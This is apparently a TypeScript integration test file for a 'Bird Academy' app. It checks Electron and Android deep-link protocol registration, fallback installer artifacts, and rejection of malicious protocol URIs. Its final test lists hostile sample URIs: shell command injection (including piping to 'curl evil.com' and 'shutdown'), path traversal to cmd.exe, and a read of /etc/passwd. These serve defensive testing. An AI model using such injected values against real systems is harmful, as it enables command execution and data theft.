import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { AppLaunchService } from '../src/features/commercial-website/services/AppLaunchService';
import { WebDownloadService } from '../src/features/commercial-website/services/WebDownloadService';

const ROOT_DIR = process.cwd();

test('AppLaunch Integration - Electron Builder Protocol Registration', () => {
  const electronBuilderPath = path.join(ROOT_DIR, 'electron-builder-user.json');
  assert.ok(fs.existsSync(electronBuilderPath), 'electron-builder-user.json must exist');
  
  const content = JSON.parse(fs.readFileSync(electronBuilderPath, 'utf8'));
  assert.ok(Array.isArray(content.protocols), 'protocols must be an array in electron-builder-user.json');
  
  const birdAcademyProto = content.protocols.find((p: any) => p.schemes && p.schemes.includes('birdacademy'));
  assert.ok(birdAcademyProto, 'birdacademy scheme must be registered in electron-builder-user.json');
  assert.equal(birdAcademyProto.name, 'Bird Academy Protocol');
});

test('AppLaunch Integration - Electron Main Protocol Handler & Security Verification', () => {
  const electronMainPath = path.join(ROOT_DIR, 'electron-main.cjs');
  assert.ok(fs.existsSync(electronMainPath), 'electron-main.cjs must exist');
  
  const content = fs.readFileSync(electronMainPath, 'utf8');
  
  // Verify protocol client registration
  assert.ok(content.includes("app.setAsDefaultProtocolClient('birdacademy')"), 'Must call setAsDefaultProtocolClient for birdacademy');
  
  // Verify second-instance protocol validation
  assert.ok(content.includes("commandLine.find(arg => typeof arg === 'string' && arg.startsWith('birdacademy://'))"), 'Must intercept protocol URL in second-instance');
  assert.ok(content.includes('PROTOCOL-SECURITY'), 'Must log security rejection for invalid protocol arguments');
  
  // Verify single instance lock exists and focuses window
  assert.ok(content.includes('app.requestSingleInstanceLock()'), 'Must request single instance lock');
  assert.ok(content.includes('mainWindow.focus()'), 'Must focus window on second-instance');
});

test('AppLaunch Integration - Android Manifest Intent Filter Verification', () => {
  const manifestPath = path.join(ROOT_DIR, 'android', 'app', 'src', 'main', 'AndroidManifest.xml');
  assert.ok(fs.existsSync(manifestPath), 'AndroidManifest.xml must exist');
  
  const content = fs.readFileSync(manifestPath, 'utf8');
  
  // Verify scheme and host intent filter
  assert.ok(content.includes('android:scheme="birdacademy"'), 'Must define android:scheme="birdacademy" in intent-filter');
  assert.ok(content.includes('android:host="open"'), 'Must define android:host="open" in intent-filter');
  assert.ok(content.includes('android.intent.action.VIEW'), 'Must define ACTION_VIEW for deep linking');
  assert.ok(content.includes('android.intent.category.BROWSABLE'), 'Must be BROWSABLE for browser invocation');
  assert.ok(content.includes('android.intent.category.DEFAULT'), 'Must have DEFAULT category');
});

test('AppLaunch Integration - WebDownloadService Integration for Fallback', () => {
  const service = AppLaunchService.getInstance();
  
  // Check Windows fallback target
  const winRec = service.getRecommendedDownload('windows');
  const winArtifact = WebDownloadService.getArtifact(winRec.filename);
  assert.ok(winArtifact, 'Recommended Windows artifact must exist in registry');
  assert.equal(winArtifact.filename, 'Bird-Academy-User-Windows-Setup.exe');
  assert.equal(winArtifact.isAvailable, true);
  
  // Check Android fallback target
  const androidRec = service.getRecommendedDownload('android');
  const androidArtifact = WebDownloadService.getArtifact(androidRec.filename);
  assert.ok(androidArtifact, 'Recommended Android artifact must exist in registry');
  assert.equal(androidArtifact.filename, 'Bird-Academy-User.apk');
  assert.equal(androidArtifact.isAvailable, true);
});

test('AppLaunch Integration - Strict Security Rejection of Arbitrary Command Executions', () => {
  const service = AppLaunchService.getInstance();
  
  const maliciousAttacks = [
    'birdacademy://open?run=calc.exe',
    'birdacademy://open/../../../../windows/system32/cmd.exe',
    'birdacademy://exec?cmd=rmdir',
    'birdacademy://open;shutdown /s',
    'birdacademy://open|curl evil.com',
    'birdacademy://open`calc`',
    'birdacademy://file://etc/passwd',
    'birdacademy://open/script<script>'
  ];
  
  for (const attack of maliciousAttacks) {
    assert.equal(
      service.validateProtocolUri(attack),
      false,
      `Malicious attack must be rejected: ${attack}`
    );
  }
});
